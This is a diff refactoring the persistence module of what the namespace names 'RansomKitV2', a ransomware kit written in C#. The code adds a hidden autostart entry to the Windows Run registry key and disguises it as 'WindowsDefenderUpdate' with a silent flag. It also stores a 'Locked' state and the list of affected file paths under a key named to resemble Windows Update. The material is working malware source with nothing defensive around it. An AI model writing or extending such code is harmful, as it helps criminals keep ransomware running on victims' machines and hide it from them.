@@ -1,118 +1,100 @@
-using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
 using System.Windows.Forms;
+using Microsoft.Win32;
 
 namespace RansomKitV2
 {
-    public static class Persistence
+    internal static class Persistence
     {
-        private const string REG_RUN = @"Software\Microsoft\Windows\CurrentVersion\Run";
-        private const string APP_NAME = "WindowsDefenderUpdate";
-        private const string REG_STATE = @"Software\Microsoft\Windows\CurrentVersion\WinUpdate";
-        private const string STATE_VAL = "Locked";
-        private const string PATHS_VAL = "EncryptedPaths";
+        private const string StateKeyPath = @"Software\Microsoft\Windows\CurrentVersion\WinUpdate";
+        private const string RunKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
+        private const string RunValueName = "WindowsDefenderUpdate";
+        private const string LockedValue = "Locked";
+        private const string PathsValue = "Paths";
 
-        public static void Enable()
+        public static void EnsureAutoStart()
         {
             try
             {
-                string exePath = Application.ExecutablePath;
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REG_RUN, true))
-                {
-                    if (key != null)
-                        key.SetValue(APP_NAME, "\"" + exePath + "\" --silent");
-                }
-
-                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(REG_STATE))
-                {
-                    if (key != null)
-                        key.SetValue(STATE_VAL, 1, RegistryValueKind.DWord);
-                }
+                using var key = Registry.CurrentUser.CreateSubKey(RunKeyPath, true);
+                if (key == null) return;
+                string exe = Process.GetCurrentProcess().MainModule?.FileName
+                             ?? Application.ExecutablePath;
+                key.SetValue(RunValueName, $"\"{exe}\" --silent", RegistryValueKind.String);
             }
             catch { }
         }
 
-        public static void Disable()
+        public static void DisableAutoStart()
         {
             try
             {
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REG_RUN, true))
-                {
-                    if (key != null)
-                        key.DeleteValue(APP_NAME, false);
-                }
-
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REG_STATE, true))
-                {
-                    if (key != null)
-                    {
-                        key.SetValue(STATE_VAL, 0, RegistryValueKind.DWord);
-                        key.DeleteValue(PATHS_VAL, false); // Clear saved paths
-                    }
-                }
+                using var key = Registry.CurrentUser.OpenSubKey(RunKeyPath, true);
+                key?.DeleteValue(RunValueName, false);
             }
             catch { }
         }
+
+        // Kept for compat with existing MainForm calls.
+        public static void Enable() => EnsureAutoStart();
 
         public static bool IsLocked()
         {
             try
             {
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REG_STATE))
-                {
-                    if (key != null)
-                    {
-                        object val = key.GetValue(STATE_VAL);
-                        if (val != null && (int)val == 1) return true;
-                    }
-                }
+                using var key = Registry.CurrentUser.OpenSubKey(StateKeyPath, false);
+                var v = key?.GetValue(LockedValue);
+                return v is int i && i == 1;
             }
-            catch { }
-            return false;
+            catch { return false; }
         }
 
-        // NEW: Save the folders the user selected
-        public static void SavePaths(List<string> paths)
+        public static void SetLocked(bool locked)
         {
             try
             {
-                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(REG_STATE))
-                {
-                    if (key != null)
-                    {
-                        string combined = string.Join("|", paths);
-                        key.SetValue(PATHS_VAL, combined, RegistryValueKind.String);
-                    }
-                }
+                using var key = Registry.CurrentUser.CreateSubKey(StateKeyPath, true);
+                key?.SetValue(LockedValue, locked ? 1 : 0, RegistryValueKind.DWord);
             }
             catch { }
         }
 
-        // NEW: Load the folders when the app restarts
+        public static void SavePaths(IEnumerable<string> paths)
+        {
+            try
+            {
+                using var key = Registry.CurrentUser.CreateSubKey(StateKeyPath, true);
+                key?.SetValue(PathsValue, string.Join('|', paths), RegistryValueKind.String);
+            }
+            catch { }
+        }
+
         public static List<string> LoadPaths()
         {
-            List<string> paths = new List<string>();
+            var list = new List<string>();
             try
             {
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REG_STATE))
-                {
-                    if (key != null)
-                    {
-                        object val = key.GetValue(PATHS_VAL);
-                        if (val != null)
-                        {
-                            string combined = val.ToString();
-                            if (!string.IsNullOrEmpty(combined))
-                            {
-                                paths.AddRange(combined.Split('|'));
-                            }
-                        }
-                    }
-                }
+                using var key = Registry.CurrentUser.OpenSubKey(StateKeyPath, false);
+                var raw = key?.GetValue(PathsValue) as string;
+                if (string.IsNullOrEmpty(raw)) return list;
+                foreach (var p in raw.Split('|', StringSplitOptions.RemoveEmptyEntries))
+                    if (Directory.Exists(p) || File.Exists(p)) list.Add(p);
             }
             catch { }
-            return paths;
+            return list;
+        }
+
+        public static void ClearPaths()
+        {
+            try
+            {
+                using var key = Registry.CurrentUser.OpenSubKey(StateKeyPath, true);
+                key?.DeleteValue(PathsValue, false);
+            }
+            catch { }
         }
     }
 }
